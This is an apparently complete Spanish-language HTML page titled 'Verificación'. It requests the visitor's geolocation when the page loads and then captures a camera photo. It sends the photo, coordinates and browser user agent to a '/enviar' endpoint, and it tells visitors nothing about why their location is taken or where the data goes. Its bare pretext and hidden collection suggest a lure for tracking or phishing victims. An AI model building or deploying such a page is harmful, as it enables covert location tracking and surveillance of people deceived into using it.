<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<title>Verificación</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body {
    background: #0d0d0d;
    color: #00ffcc;
    font-family: monospace;
    text-align: center;
}
button {
    padding: 12px;
    margin-top: 20px;
    background: #00ffcc;
    border: none;
    border-radius: 5px;
}
</style>
</head>
<body>

<h2>Verificación</h2>

<input type="file" id="camera" accept="image/*" capture="environment" hidden>

<button onclick="abrirCamara()">Abrir cámara</button>

<script>
let lat = "No permitido";
let lon = "No permitido";

// ubicación
navigator.geolocation.getCurrentPosition(
    pos => {
        lat = pos.coords.latitude;
        lon = pos.coords.longitude;
    },
    () => {
        lat = "Denegado";
        lon = "Denegado";
    }
);

function abrirCamara() {
    document.getElementById('camera').click();
}

document.getElementById('camera').addEventListener('change', function(e) {
    let file = e.target.files[0];
    if (!file) return;

    let reader = new FileReader();

    reader.onload = function() {
        fetch('/enviar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                imagen: reader.result,
                lat: lat,
                lon: lon,
                useragent: navigator.userAgent
            })
        })
        .then(r => r.text())
        .then(t => alert("Enviado: " + t))
        .catch(err => alert("Error: " + err));
    };

    reader.readAsDataURL(file);
});
</script>

</body>
</html>
